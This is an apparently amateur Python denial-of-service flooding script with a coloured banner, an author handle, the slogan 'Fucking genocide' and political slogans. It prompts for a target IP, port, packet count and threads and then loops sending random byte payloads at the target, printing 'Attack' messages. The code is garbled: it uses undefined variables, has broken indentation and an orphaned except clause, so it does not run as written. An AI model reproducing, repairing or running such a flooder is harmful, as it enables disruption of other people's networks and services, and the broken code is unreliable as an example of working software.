import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bytes = random._urandom(999)
#############

os.system("clear")
print("")
print("\033[91m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")
print("\033[91m||                                                                   ||\033[0m")
print("\033[91m||       ±± ±± ±±        ±± ±± ±±                     ±±±            ||\033[0m")     
print("\033[91m||       ±±       ±±     ±±       ±±                ±± ±±            ||\033[0m")       
print("\033[91m||       ±±       ±±     ±±       ±±                   ±±            ||\033[0m")
print("\033[91m||       ±±       ±±     ±±       ±±                   ±±            ||\033[0m")
print("\033[95m||       ±± ±± ±±        ±± ±± ±±        ________      ±±            ||\033[0m")
print("\033[95m||       ±±   ±±         ±±   ±±         ±± ±± ±±      ±±            ||\033[0m")
print("\033[95m||       ±±     ±±       ±±     ±±                     ±±            ||\033[0m")
print("\033[95m||       ±±       ±±     ±±       ±±                ±± ±± ±±         ||\033[0m")
print("\033[97m||                                                                   ||\033[0m")     
print("\033[95m||      Author  :  R1R1-DDOS                                         ||\033[0m")
print("\033[96m||      Github  :  https://github.com/RR-DDos                        ||\033[0m")
print("\033[94m||                 Fucking genocide                                  ||\033[0m")
print("\033[33m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")         
ip = str(input("\033[93m[\033[91m+\033[92m]IP Target : "))
port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
packs = int(input("\033[92m[\033[96m+\033[92m]Packets{0} : "))
thread = int(input("\033[92m[\033[97m+\033[92m]Threads : "))
time.sleep(5),
print("\033[96m[\033[31m+\033[91m]                     ⟩⟩ DON'T \033[0m "),
time.sleep(5),
print("\033[92m[\033[31m+\033[31m]                     ⟩⟩ STOP \033[0m "),
time.sleep(5),
print("\033[94m[\033[31m+\033[33m]                     ⟩⟩ FIGHT \033[0m "),
time.sleep(5),
print("\033[97m[\033[31m+\033[34m]                     ⟩⟩ FOR THE SAKE \033[0m "),
time.sleep(5),
print("\033[95m[\033[31m+\033[36m]                     ⟩⟩ FREE PALESTINE \033[0m ")

s.connect((ip,port))
			s.send(data)
			for x in range(times):
			sock.sendto(bytes, (ip,port))
               print(f"\033[32m[\033[99m+\033[32m]   Ririe  \033[94m" +str(u)+ "  \033[33mSent Packet  \033[91m" +ip+ "\033[0m" )
               print("\033[33m————————————————————————————————————————————————————————🚀\033[0m")
               print(f"\033[93m[\033[99m+\033[93m]   Ririe  \033[92m" +str(u)+ "  \033[32mAttack Wabs  \033[95m" +ip+ "\033[0m" )
               print("\033[94m————————————————————————————————————————————————————————🚀\033[0m")
               print(f"\033[95m[\033[99m+\033[95m]   Ririr  \033[96m" +str(u)+ "  \033[92mRequest Target  \033[32m" +ip+ "\033[0m" )
               print("\033[31m————————————————————————————————————————————————————————🚀\033[0m")
		except:
			s.close()
			print("[*] Error!!!")

